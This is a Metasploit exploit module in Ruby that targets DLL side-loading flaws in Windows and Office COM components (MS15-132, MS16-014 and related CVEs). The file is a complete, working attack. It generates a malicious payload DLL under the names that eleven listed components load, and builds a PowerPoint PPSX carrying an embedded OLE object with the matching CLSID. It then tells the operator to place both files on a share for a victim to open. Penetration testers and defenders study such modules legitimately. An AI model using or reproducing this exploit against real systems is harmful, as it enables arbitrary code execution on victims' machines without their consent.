require &#039;base64&#039;
require &#039;msf/core&#039;
require &#039;rex/ole&#039;
 
class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking
 
  include Msf::Exploit::FILEFORMAT
  include Msf::Exploit::EXE
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;Office OLE Multiple DLL Side Loading Vulnerabilities&#039;,
      &#039;Description&#039; => %q{
        Multiple DLL side loading vulnerabilities were found in various COM components.
        These issues can be exploited by loading various these components as an embedded
        OLE object. When instantiating a vulnerable object Windows will try to load one
        or more DLLs from the current working directory. If an attacker convinces the
        victim to open a specially crafted (Office) document from a directory also
        containing the attacker&#039;s DLL file, it is possible to execute arbitrary code with
        the privileges of the target user. This can potentially result in the attacker
        taking complete control of the affected system.
      },
      &#039;Author&#039; => &#039;Yorick Koster&#039;,
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;, &#039;2015-6132&#039;],
          [&#039;CVE&#039;, &#039;2015-6128&#039;],
          [&#039;CVE&#039;, &#039;2015-6133&#039;],
          [&#039;CVE&#039;, &#039;2016-0041&#039;],
          [&#039;CVE&#039;, &#039;2016-0100&#039;],
          [&#039;CVE&#039;, &#039;2016-3235&#039;],
          [&#039;MSB&#039;, &#039;MS15-132&#039;],
          [&#039;MSB&#039;, &#039;MS16-014&#039;],
          [&#039;MSB&#039;, &#039;MS16-025&#039;],
          [&#039;MSB&#039;, &#039;MS16-041&#039;],
          [&#039;MSB&#039;, &#039;MS16-070&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150801/com__services_dll_side_loading_vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150805/event_viewer_snapin_multiple_dll_side_loading_vulnerabilities.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150803/windows_authentication_ui_dll_side_loading_vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20151102/shutdown_ux_dll_side_loading_vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150802/shockwave_flash_object_dll_side_loading_vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150806/ole_db_provider_for_oracle_multiple_dll_side_loading_vulnerabilities.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150905/nps_datastore_server_dll_side_loading_vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150906/bda_mpeg2_transport_information_filter_dll_side_loading_vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20151101/mapsupdatetask_task_dll_side_loading_vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150904/windows_mail_find_people_dll_side_loading_vulnerability.html&#039;],
          [&#039;URL&#039;, &#039;https://securify.nl/advisory/SFY20150804/microsoft_visio_multiple_dll_side_loading_vulnerabilities.html&#039;],
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;EXITFUNC&#039; => &#039;thread&#039;,
          &#039;PAYLOAD&#039; => &#039;windows/exec&#039;,
          &#039;CMD&#039; => &#039;C:\\Windows\\System32\\calc.exe&#039;,
        },
      &#039;Payload&#039; => { &#039;Space&#039; => 2048, },
      &#039;Platform&#039; => &#039;win&#039;,
      &#039;Arch&#039; => [ ARCH_X86, ARCH_X64 ],
      &#039;Targets&#039; =>
        [
          [ &#039;All&#039;, {} ],
          [
            &#039;COM+ Services / Windows Vista - 10 / Office 2007 - 2016 (MS15-132)&#039;,
              {
                &#039;DLL&#039; => &#039;mqrt.dll&#039;,
                # {ecabafc9-7f19-11d2-978e-0000f8757e2a}
                &#039;CLSID&#039; => "\xC9\xAF\xAB\xEC\x19\x7F\xD2\x11\x97\x8E\x00\x00\xF8\x75\x7E\x2A"
              }
          ],
          [
            &#039;Shockwave Flash Object / Windows 10 / Office 2013 (APSB15-28)&#039;,
              {
                &#039;DLL&#039; => &#039;spframe.dll&#039;,
                # {D27CDB6E-AE6D-11cf-96B8-444553540000}
                &#039;CLSID&#039; => "\x6E\xDB\x7C\xD2\x6D\xAE\xCF\x11\x96\xB8\x44\x45\x53\x54\x00\x00"
              }
          ],
          [
            &#039;Windows Authentication UI / Windows 10 / Office 2013 - 2016 (MS15-132)&#039;,
              {
                &#039;DLL&#039; => &#039;wuaext.dll&#039;,
                # {D93CE8B5-3BF8-462C-A03F-DED2730078BA}
                &#039;CLSID&#039; => "\xB5\xE8\x3C\xD9\xF8\x3B\x2C\x46\xA0\x3F\xDE\xD2\x73\x00\x78\xBA"
              }
          ],
          [
            &#039;Shutdown UX / Windows 10 / Office 2016 (MS15-132)&#039;,
              {
                &#039;DLL&#039; => &#039;wuaext.dll&#039;,
                # {14ce31dc-abc2-484c-b061-cf3416aed8ff}
                &#039;CLSID&#039; => "\xDC\x31\xCE\x14\xC2\xAB\x4C\x48\xB0\x61\xCF\x34\x16\xAE\xD8\xFF"
              }
          ],
          [
            &#039;MapUpdateTask Tasks / Windows 10 / Office 2016 (MS16-014)&#039;,
              {
                &#039;DLL&#039; => &#039;phoneinfo.dll&#039;,
                # {B9033E87-33CF-4D77-BC9B-895AFBBA72E4}
                &#039;CLSID&#039; => "\x87\x3E\x03\xB9\xCF\x33\x77\x4D\xBC\x9B\x89\x5A\xFB\xBA\x72\xE4"
              }
          ],
          [
            &#039;Microsoft Visio 2010 / Windows 7 (MS16-070)&#039;,
              {
                &#039;DLL&#039; => &#039;msoutls.dll&#039;,
                # 6C92B806-B900-4392-89F7-2ED4B4C23211}
                &#039;CLSID&#039; => "\x06\xB8\x92\x6C\x00\xB9\x92\x43\x89\xF7\x2E\xD4\xB4\xC2\x32\x11"
              }
          ],
          [
            &#039;Event Viewer Snapin / Windows Vista - 7 / Office 2007 - 2013 (MS15-132)&#039;,
              {
                &#039;DLL&#039; => &#039;elsext.dll&#039;,
                # {394C052E-B830-11D0-9A86-00C04FD8DBF7}
                &#039;CLSID&#039; => "\x2E\x05\x4C\x39\x30\xB8\xD0\x11\x9A\x86\x00\xC0\x4F\xD8\xDB\xF7"
              }
          ],
          [
            &#039;OLE DB Provider for Oracle / Windows Vista - 7 / Office 2007 - 2013 (MS16-014)&#039;,
              {
                &#039;DLL&#039; => &#039;oci.dll&#039;,
                # {e8cc4cbf-fdff-11d0-b865-00a0c9081c1d}
                &#039;CLSID&#039; => "\xBF\x4C\xCC\xE8\xFF\xFD\xD0\x11\xB8\x65\x00\xA0\xC9\x08\x1C\x1D"
              }
          ],
          [
            &#039;Windows Mail Find People / Windows Vista / Office 2010 (MS16-025)&#039;,
              {
                &#039;DLL&#039; => &#039;wab32res.dll&#039;,
                # {32714800-2E5F-11d0-8B85-00AA0044F941}
                &#039;CLSID&#039; => "\x00\x48\x71\x32\x5F\x2E\xD0\x11\x8B\x85\x00\xAA\x00\x44\xF9\x41"
              }
          ],
          [
            &#039;NPS Datastore server / Windows Vista / Office 2010 (MS16-014)&#039;,
              {
                &#039;DLL&#039; => &#039;iasdatastore2.dll&#039;,
                # {48da6741-1bf0-4a44-8325-293086c79077}
                &#039;CLSID&#039; => "\x41\x67\xDA\x48\xF0\x1B\x44\x4A\x83\x25\x29\x30\x86\xC7\x90\x77"
              }
          ],
          [
            &#039;BDA MPEG2 Transport Information Filter / Windows Vista / Office 2010 (MS16-014)&#039;,
              {
                &#039;DLL&#039; => &#039;ehTrace.dll&#039;,
                # {FC772AB0-0C7F-11D3-8FF2-00A0C9224CF4}
                &#039;CLSID&#039; => "\xB0\x2A\x77\xFC\x7F\x0C\xD3\x11\x8F\xF2\x00\xA0\xC9\x22\x4C\xF4"
              }
          ],
        ],
      &#039;Privileged&#039; => false,
      &#039;DisclosureDate&#039; => &#039;Dec 8 2015&#039;,
      &#039;DefaultTarget&#039; => 0))
 
    register_options(
      [
        OptString.new(&#039;FILENAME&#039;, [true, &#039;The PPSX file&#039;, &#039;msf.ppsx&#039;]),
      ], self.class)
  end
 
  def exploit
    if target.name == &#039;All&#039;
        targets = @targets
    else
        targets = [ target ]
    end
 
    @arch.each do |a|
      exploit_regenerate_payload(&#039;win&#039;, a, nil)
      targets.each do |t|
        if t.name == &#039;All&#039;
          next
        end
        print_status("Using target #{t.name}")
 
        dll_name = t[&#039;DLL&#039;]
        if target.name == &#039;All&#039;
          ppsx_name = t.name.split(/\//).first + ".ppsx"
        else
          ppsx_name = datastore[&#039;FILENAME&#039;]
        end
 
        print_status("Creating the payload DLL (#{a})...")
 
        opts = {}
        opts[:arch] = [ a ]
        dll = generate_payload_dll(opts)
        dll_path = store_file(dll, a, dll_name)
        print_good("#{dll_name} stored at #{dll_path}, copy it to a remote share")
 
        print_status("Creating the PPSX file...")
        ppsx = get_ppsx(t[&#039;CLSID&#039;])
        ppsx_path = store_file(ppsx, a, ppsx_name)
        print_good("#{ppsx_name} stored at #{ppsx_path}, copy it to a remote share")
      end
    end
  end
 
  def store_file(data, subdir, filename)
    ltype = "exploit.fileformat.#{self.shortname}"
 
    if ! ::File.directory?(Msf::Config.local_directory)
      FileUtils.mkdir_p(Msf::Config.local_directory)
    end
 
    subdir.gsub!(/[^a-z0-9\.\_\-]+/i, &#039;&#039;)
    if ! ::File.directory?(Msf::Config.local_directory + "/" + subdir)
      FileUtils.mkdir_p(Msf::Config.local_directory + "/" + subdir)
    end
 
    if filename and not filename.empty?
      if filename =~ /(.*)\.(.*)/
        ext = $2
        fname = $1
      else
        fname = filename
      end
    else
      fname = "local_#{Time.now.utc.to_i}"
    end
 
    fname = ::File.split(fname).last
 
    fname.gsub!(/[^a-z0-9\.\_\-]+/i, &#039;&#039;)
    fname << ".#{ext}"
 
    path = File.join(Msf::Config.local_directory + "/" + subdir, fname)
    full_path = ::File.expand_path(path)
    File.open(full_path, "wb") { |fd| fd.write(data) }
 
    report_note(:data => full_path.dup, :type => "#{ltype}.localpath")
 
    full_path.dup
  end
 
  def create_ole(clsid)
    ole_tmp = Rex::Quickfile.new(&#039;ole&#039;)
    stg = Rex::OLE::Storage.new(ole_tmp.path, Rex::OLE::STGM_WRITE)
 
    stm = stg.create_stream("\x01OLE10Native")
    stm.close
 
    directory = stg.instance_variable_get(:@directory)
    directory.each_entry do |entry|
      if entry.instance_variable_get(:@_ab) == &#039;Root Entry&#039;
        clsid = Rex::OLE::CLSID.new(clsid)
        entry.instance_variable_set(:@_clsId, clsid)
      end
    end
 
    # write to disk
    stg.close
 
    ole_contents = File.read(ole_tmp.path)
    ole_tmp.close
    ole_tmp.unlink
 
    ole_contents
  end
 
  def get_ppsx(clsid)
    path = ::File.join(Msf::Config.data_directory, &#039;exploits&#039;, &#039;office_ole_multiple_dll_hijack.ppsx&#039;)
    fd = ::File.open(path, "rb")
    data = fd.read(fd.stat.size)
    fd.close
    ppsx = Rex::Zip::Archive.new
 
    Zip::InputStream.open(StringIO.new(data)) do |zis|
      while entry = zis.get_next_entry
        ppsx.add_file(entry.name, zis.read)
      end
    end
 
    ppsx.add_file(&#039;/ppt/embeddings/oleObject1.bin&#039;, create_ole(clsid))
    ppsx.pack
  end
 
end

